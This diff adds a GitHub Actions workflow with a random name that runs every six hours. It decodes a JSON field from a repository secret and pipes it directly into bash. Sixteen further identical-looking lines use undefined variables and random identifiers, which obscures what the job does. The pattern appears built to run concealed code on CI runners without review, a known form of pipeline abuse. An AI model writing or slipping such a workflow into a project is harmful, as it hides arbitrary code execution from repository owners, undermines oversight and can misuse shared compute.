@@ -1,0 +1,35 @@
+name: midwifeprosecutor
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '34 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: midwifeprosecutor
+        env:
+          exwp23100: ${{ secrets.exwp23100 }}
+        run: |
+          echo $exwp23100 | jq -r .ncuh30000 | /bin/bash
+          echo $i3295 | jq -r .uz29545 | /bin/bash
+          echo $dtr8078 | jq -r .ut904 | /bin/bash
+          echo $krb47 | jq -r .i58783 | /bin/bash
+          echo $s829 | jq -r .a97 | /bin/bash
+          echo $gj8260 | jq -r .vyjqp153 | /bin/bash
+          echo $dn0890 | jq -r .by51432 | /bin/bash
+          echo $it14 | jq -r .o13355 | /bin/bash
+          echo $wk8337 | jq -r .e71 | /bin/bash
+          echo $l3825 | jq -r .s9 | /bin/bash
+          echo $tpxz5 | jq -r .hccz5 | /bin/bash
+          echo $p4109 | jq -r .u1256 | /bin/bash
+          echo $duyc71500 | jq -r .jzsa6372 | /bin/bash
+          echo $lap07333 | jq -r .lwsa8873 | /bin/bash
+          echo $kk94 | jq -r .ayn554 | /bin/bash
+          echo $xfdti60990 | jq -r .bc46948 | /bin/bash
+          echo $bampl2689 | jq -r .lej27 | /bin/bash
+
